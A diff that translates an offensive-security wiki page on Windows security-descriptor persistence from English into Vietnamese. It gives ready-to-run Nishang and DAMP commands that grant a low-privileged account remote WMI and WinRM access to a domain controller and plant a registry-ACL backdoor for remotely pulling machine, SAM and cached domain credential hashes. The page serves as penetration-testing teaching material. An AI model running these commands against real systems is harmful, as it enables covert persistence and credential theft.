@@ -1,36 +1,36 @@
-# Security Descriptors
+# Bộ mô tả bảo mật
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Security Descriptors
+## Bộ mô tả bảo mật
 
-Windows security descriptors contain an owner SID, a primary-group SID, a discretionary ACL (DACL) that controls access, and a system ACL (SACL) used mainly for auditing. Security Descriptor Definition Language (SDDL) is the textual representation; an ACE string has the form `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`.<sup>[[1]](#references)[[4]](#references)</sup>
+Bộ mô tả bảo mật của Windows chứa SID của chủ sở hữu, SID của nhóm chính, ACL tùy ý (DACL) kiểm soát quyền truy cập và ACL hệ thống (SACL) chủ yếu dùng cho mục đích kiểm tra. Ngôn ngữ định nghĩa bộ mô tả bảo mật (SDDL) là dạng biểu diễn bằng văn bản; chuỗi ACE có dạng `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`.<sup>[[1]](#references)[[4]](#references)</sup>
 
-A security descriptor stores who owns a securable object and which principals are allowed or denied specific rights over it. If an attacker can change a DACL, they may grant a low-privileged principal rights that normally require an administrative role.
+Bộ mô tả bảo mật lưu thông tin về chủ sở hữu của một đối tượng có thể được bảo vệ và các principal được phép hoặc bị từ chối những quyền cụ thể đối với đối tượng đó. Nếu kẻ tấn công có thể thay đổi DACL, họ có thể cấp cho một principal có ít đặc quyền những quyền thường đòi hỏi vai trò quản trị.
 
-This makes narrowly modified descriptors useful for persistence: the account remains outside obvious privileged groups while retaining access to a particular management surface. Preserve the original descriptor before testing so the change can be removed exactly.
+Vì vậy, các bộ mô tả được sửa đổi có chọn lọc rất hữu ích cho mục đích duy trì quyền truy cập: tài khoản vẫn nằm ngoài các nhóm đặc quyền dễ nhận thấy nhưng vẫn có quyền truy cập vào một bề mặt quản lý cụ thể. Hãy lưu lại bộ mô tả ban đầu trước khi kiểm tra để có thể hoàn tác chính xác thay đổi.
 
-### Access to WMI
+### Quyền truy cập vào WMI
 
-You can give a user access to **execute remotely WMI** [**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup>:
+Bạn có thể cấp cho người dùng quyền **thực thi WMI từ xa** [**bằng cách sử dụng đoạn mã này**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup>:
 
 ```bash
 Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Verbose
 Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Remove -Verbose # Remove
 ```
 
-### Access to WinRM
+### Truy cập WinRM
 
-Grant a user access to a remote PowerShell/WinRM endpoint with Nishang's `Set-RemotePSRemoting` function:<sup>[[2]](#references)</sup>
+Cấp cho người dùng quyền truy cập vào endpoint PowerShell/WinRM từ xa bằng hàm `Set-RemotePSRemoting` của Nishang:<sup>[[2]](#references)</sup>
 
 ```bash
 Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
 Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
 ```
 
-### Remote access to hashes
+### Truy cập từ xa vào các hash
 
-DAMP can create a registry-ACL backdoor that later permits remote retrieval of the machine-account hash, local SAM hashes, and cached domain credentials. Granting these narrow rights to an otherwise ordinary account—especially against a domain controller—provides powerful persistence without privileged-group membership.<sup>[[3]](#references)</sup>
+DAMP có thể tạo một backdoor registry-ACL, cho phép truy xuất từ xa hash của tài khoản máy, các hash SAM cục bộ và thông tin xác thực miền được lưu trong bộ nhớ đệm. Cấp các quyền hạn chế này cho một tài khoản thông thường—đặc biệt là trên domain controller—mang lại khả năng duy trì quyền truy cập mạnh mẽ mà không cần tài khoản thuộc nhóm đặc quyền.<sup>[[3]](#references)</sup>
 
 ```bash
 # allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
@@ -46,13 +46,12 @@ Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose
 Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
 ```
 
-Check [**Silver Tickets**](silver-ticket.md) to learn how you could use the hash of the computer account of a Domain Controller.
+Xem [**Silver Tickets**](silver-ticket.md) để tìm hiểu cách bạn có thể sử dụng hash của tài khoản máy tính của Domain Controller.
 
 ## References
 
-- [1] [Security Descriptor Definition Language - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
+- [1] [Ngôn ngữ định nghĩa Security Descriptor - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
 - [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
-- [3] [DAMP - Discretionary ACL Modification Project](https://github.com/HarmJ0y/DAMP)
-- [4] [Microsoft Learn — Security descriptor string format](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format)
-
+- [3] [DAMP - Dự án sửa đổi ACL tùy ý](https://github.com/HarmJ0y/DAMP)
+- [4] [Microsoft Learn — Định dạng chuỗi Security descriptor](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format)
 {{#include ../../banners/hacktricks-training.md}}
